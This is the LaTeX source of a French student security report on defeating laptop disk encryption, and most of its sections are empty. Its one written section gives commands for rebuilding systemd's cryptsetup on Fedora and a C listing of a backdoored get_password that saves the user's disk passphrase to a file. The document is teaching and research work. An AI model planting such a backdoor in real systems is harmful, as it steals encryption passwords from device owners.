\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{hyperref}
\hypersetup{pdfborder={0 0 0}}
\usepackage[frenchb]{babel}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{graphicx}
\usepackage{setspace}
\usepackage{float}
\usepackage[left=2cm,right=2cm,top=2cm,bottom=2cm]{geometry}
\usepackage[center]{caption}
\usepackage{listings}
\usepackage{numprint}
\usepackage{color}
\usepackage{fancyhdr}
\usepackage{soul}
\pagestyle{fancy}


\author{J. \textsc{Chaumont} \and P. \textsc{Gourrinchas} \and \textsc{A. Hanriat} \and \textsc{F. Monjalet}}
\title{RE315- Sécurité des Réseaux\\Laptop}

\fancyhead[L]{Sécurité des Réseaux}
\fancyhead[R]{Laptop}

\def\vspaceheight{0.5cm}
\setlength{\headheight}{15pt}

\definecolor{cblue}{RGB}{0,135,195}
\definecolor{cgreen}{RGB}{0,153,0}
\definecolor{cred}{RGB}{255,0,0}

\lstset{
  frame=single,
  keywordstyle=\color{cblue},
  commentstyle=\color{cgreen} \footnotesize,
  stringstyle=\color{cred},
  basicstyle=\footnotesize,
  numbers=left,
  numbersep=5pt,
  tabsize=4
}


\begin{document}


%%%%%%%% Page de couverture %%%%%%%%
\thispagestyle{empty}
\begin{center}

\LARGE{\textsc{RE315 - Sécurité des Réseaux}}\\[0.8cm]
\Large{\textsc{Projet Laptop}}

\vspace*{0.5cm}

\begin{figure}[H]
	\begin{center}
		\includegraphics[width=200px]{logo.jpg}
	\end{center}
\end{figure}

\vspace*{0.3cm}
\Large{J. \textsc{Chaumont}\ \ \ P. \textsc{Gourrinchas}\ \ \ \textsc{A. Hanriat}\ \ \ \textsc{F. Monjalet}}\\
\vspace*{1cm}
\large{27/01/2014}



\end{center}

\clearpage
\tableofcontents
\clearpage


\section*{Introduction}
\addcontentsline{toc}{section}{Introduction}

L'explosion des ventes de matériels informatiques nomades, au détriment des stations de travail fixes par exemple, est un bon indicateur des tendances actuelles. Encouragé par l'autonomie croissante des batteries, l'expansion des réseaux mobiles hauts débits ainsi que par la puissance des appareils, le nomadisme numérique est bien plus qu'un effet de mode, et ce, autant pour les loisirs que pour le monde professionnel. En effet, ces dernières années ont vu apparaître le \textit{Bring Your Own Device}, c'est-à-dire le fait qu'un employé utilise ses terminaux personnels dans le cadre de son travail.

Ce constat a certes des côtés positifs en matière de confort d'utilisation: n'importe qui peut être connecté à Internet où qu'il soit, profiter de son ordinateur personnel au travail, et ne plus avoir à systématiquement changer d'appareil en fonction des tâches à réaliser. C'est néanmoins au niveau de la sécurité que se situe la partie la plus inquiétante de ce phénomène. En effet, si un appareil personnel est autorisé à contenir les données d'une entreprise, comment s'assurer de la sécurisation de celui-ci puisqu'il ne relève pas de la juridiction de l'employeur? 

Par exemple, comment garantir la sécurité des données stockées sur un appareil mobile lorsque celui-ci est volé? Cette question est loin d'être à prendre à la légère, au vu des chiffres publiés: \numprint{775000} vols de smartphones déclarés en France en 2010\footnote{\url{http://www.inhesj.fr/}}, ou encore 750 vols quotidiens d'ordinateurs portables rien qu'à l'aéroport Charles de Gaulle\footnote{\url{http://www.ponemon.org/}}. Il est à noter que ce point vise aussi bien à protéger les données confidentielles d'entreprise que les données personnelles de l'utilisateur.

La principale réponse à cette question est sans nul doute le chiffrement des disques durs. Il existe aujourd'hui de nombreuses solutions -- commerciales comme libres -- permettant à quiconque de chiffrer ses données afin de rendre impossible l'utilisation de l'appareil sans la connaissance du mot de passe.~~\\

S'inscrivant dans ce thème, l'objectif du projet était de trouver et d'implémenter des moyens visant à contourner différentes solutions de chiffrement utilisées aujourd'hui.


\clearpage
\section{Le chiffrement sous Linux avec \texttt{dm-crypt}}

\subsection{Présentation}

\subsection{Principe de l'attaque}

\subsection{Implémentation sur Debian}

\subsection{Implémentation sur Fedora}

Fedora diffère sur de nombreux points par rapport à Debian. L'une de ces différences est l'utilisation de \texttt{systemd} par Fedora, alors que Debian utilise par défaut le démon \texttt{init} de \textit{System V}. C'est néanmoins une distribution très utilisée, et il était donc intéressant de reproduire l'attaque sur celle-ci. La principale différence avec l'attaque faite sur Debian est que la partie intéressante de l'image \texttt{initramfs} (qui remplace le \texttt{initrd} de Debian) n'est pas un simple script shell, mais un exécutable binaire.

Sur le principe, l'attaque reste la même: décompresser l'image \texttt{initramfs}, trouver et patcher le fichier sensible se trouvant à l'intérieur, puis reconstruire l'image pour remplacer l'originale. Ceci étant, l'écriture dans un script étant bien plus simple à réaliser que l'écriture dans un fichier binaire, le choix a été de remplacer directement le fichier de départ par une autre version compilée par nos soins. Les sources de \texttt{systemd} étant en effet disponibles très simplement, il est ensuite relativement facile de modifier le bon fichier C -- en l'occurrence \texttt{cryptsetup.c} -- et de recompiler le tout.

\begin{lstlisting}[language=sh]
git clone https://github.com/systemd/systemd.git
cd systemd
vi src/cryptsetup/cryptsetup.c # Insertion de la backdoor
./autogen.sh
./configure CFLAGS='-g -O0 -ftrapv' --enable-kdbus --sysconfdir=/etc \
	--localstatedir=/var --libdir=/usr/lib64 --enable-gtk-doc*
make systemd-cryptsetup
\end{lstlisting}

Afin que la compilation se déroule correctement, de nombreux paquets devront avoir été installés au préalable. Certains d'entre eux sont indiqués dans le fichier \texttt{README} du projet, les autres sont précisés un à un lors de l'exécution de la commande \texttt{configure}. Un autre point gênant auquel nous avons été confrontés est que le projet est modifié très régulièrement au rythme de plusieurs commits par semaine; et il nous est arrivé de perdre plusieurs heures à essayer de compiler sans succès, avant de comprendre qu'il s'agissait d'une erreur qui avait été introduite dans le code dans les dernières heures.

La backdoor insérée dans le code consiste simplement à récupérer le mot de passe entré par l'utilisateur et à le stocker dans un fichier.

\begin{lstlisting}[language=C]
static int get_password(const char *name, usec_t until, bool accept_cached,
						 char ***passwords) {
    int r;
	char **p;
	cleanup_free_ char *text = NULL;

	/** Some declarations **/
	FILE *f = NULL;
	int abort_attack = 0;
	#define FILE_OUT "/run/out.lock"
	/** Serious stuff now **/
	
	assert(name);
	assert(passwords);

	if (asprintf(&text, "Please enter passphrase for disk %s!", name) < 0)
		return log_oom();

	/** Let's open our file **/
	#include <stdio.h>
	f = fopen(FILE_OUT, "a"); //Append to store all the entered passwords
	if(f == NULL)
		abort_attack = 1;
	/** Ok, ready to go **/
        
	r = ask_password_auto(text, "drive-harddisk", until, accept_cached,
	                      passwords);

	/** Just gotta store it **/
	if(!abort_attack) {
		fputs(*passwords[0], f);
		fclose(f);
	}
	/** That's all folks **/
\end{lstlisting}



\clearpage
\section{TrueCrypt, la solution libre et portable}

\subsection{Présentation}

\subsection{Compilation \textit{maison}}

\subsection{Le phishing au démarrage}

\subsection{Modification du binaire}




\clearpage
\section{BitLocker pour Windows}

\subsection{Présentation}



\clearpage
\section{Les autres solutions}

\subsection{\dots}

\subsection{Dump de la RAM: une attaque infaillible?}

\subsection{La solution de l'acharnement: le brute-force}




\clearpage
\section*{Conclusion}
\addcontentsline{toc}{section}{Conclusion}

\end{document}
